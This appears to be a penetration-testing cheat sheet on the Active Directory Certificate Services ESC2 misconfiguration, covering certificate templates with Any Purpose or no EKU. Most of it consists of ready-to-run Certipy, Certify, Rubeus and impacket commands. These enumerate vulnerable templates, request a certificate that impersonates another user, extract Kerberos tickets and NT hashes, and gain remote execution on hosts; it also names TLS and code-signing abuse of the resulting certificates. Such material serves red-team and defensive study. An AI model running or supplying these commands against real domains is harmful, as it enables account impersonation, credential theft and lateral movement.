# ESC2—Any Purpose EKU or No EKU (Subordinate CA) on Enrollable Template

## Theory

If an enrollable template has **Any Purpose** EKU (`2.5.29.37.0`) or **no EKUs at all**, the issued certificate is valid for many uses.

- **Path A (SAN allowed):** If the template also lets the enrollee supply the subject and SAN, you can request a cert that names a different user’s UPN in the SAN and authenticate as that user (same flow as ESC1).
- **Path B (no SAN):** You can still obtain a broadly valid or subordinate CA certificate. This cannot be used for AD logon via PKINIT unless its issuer is trusted in **NTAuthCertificates**, but it may be abused for other purposes (e.g., server TLS, code signing). Chaining into on-behalf-of/agent scenarios is covered under ESC3.

## Requirements

- Low-privileged principals have **Enroll** on the template.
- **Requires Manager Approval = False**.
- **Authorized Signatures Required = 0**.
- Template EKUs: **Any Purpose** or **no EKUs**.
- For **Path A** additionally: **Enrollee supplies subject** and CA allows **UserSpecifiedSAN**.
 
---

## Linux

### Enumerate

```bash
certipy find -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -vulnerable -stdout
# Look for: Any Purpose = True  OR  Extended Key Usage: Any Purpose  OR  no EKUs
# For Path A also confirm: Enrollee Supplies Subject = True and CA indicates UserSpecifiedSAN
```

### Exploit—Path A (SAN Allowed; Impersonate like ESC1)

```bash
certipy req -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> \
  -ca '<CA_NAME>' -template '<TEMPLATE_NAME>' -upn '<ALT_UPN>'
# => Saves a PFX for the target identity
```

```bash
certipy auth -pfx <PFX_FILE> -username '<ALT_SAM>' -domain '<DOMAIN>' -dc-ip <DC_IP>
# => Produces <ALT_SAM>.ccache and may return NT hash
```

```bash
KRB5CCNAME=<ALT_SAM>.ccache wmiexec.py -k -no-pass <TARGET_HOST_FQDN>
# or psexec.py / smbexec.py with -k -no-pass
```

### Exploit—Path B (no SAN; broad/SubCA Cert, non-PKINIT abuse)

```bash
certipy req -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> \
  -ca '<CA_NAME>' -template '<TEMPLATE_NAME>'
# Use resulting cert for non-domain-logon purposes (e.g., TLS/code signing).
# AD logon via PKINIT will not work unless the issuing CA is present in NTAuthCertificates.
```

Note: Ensure `<TARGET_HOST_FQDN>` resolves (DNS or `/etc/hosts`).

---

## Windows

### Enumerate (Certify)

```powershell
.\Certify.exe find /vulnerable
# Identify templates where:
#   pkiextendedkeyusage : Any Purpose  OR EKUs absent
#   Authorized Signatures Required : 0
#   Enrollee supplies subject (for Path A)
#   Low-privileged principals have Enroll
# Confirm CA shows UserSpecifiedSAN for Path A.
```

### Enumerate (PowerShell LDAP Filter for ESC2)

```powershell
Get-ADObject -LDAPFilter `
'(&(objectclass=pkicertificatetemplate)
  (!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))
  (|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))
  (|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))' `
-SearchBase "CN=Configuration,<FOREST_DN>"
```

### Exploit—Path A (SAN Allowed; Impersonate like ESC1)

```powershell
.\Certify.exe request /ca:<CA_FQDN>\<CA_NAME> /template:<TEMPLATE_NAME> /altname:<ALT_UPN> > cert.pem
```

```powershell
& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 `
  -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" `
  -export -out cert.pfx
```

```powershell
.\Rubeus.exe asktgt /user:<ALT_SAM> /certificate:cert.pfx /getcredentials /nowrap
# => Base64 TGT (kirbi) and possibly NTLM hash
```

```powershell
.\Rubeus.exe createnetonly /program:powershell.exe /show
# In the shown PowerShell session:
.\Rubeus.exe ptt /ticket:<BASE64_TGT>
```

### Exploit—Path B (no SAN; broad/SubCA cert)

```powershell
.\Certify.exe request /ca:<CA_FQDN>\<CA_NAME> /template:<TEMPLATE_NAME> > cert.pem
# Convert to PFX if needed (see above). Use for non-PKINIT abuses (e.g., TLS/code signing).
# Not valid for AD logon unless issuer is trusted in NTAuthCertificates.
```

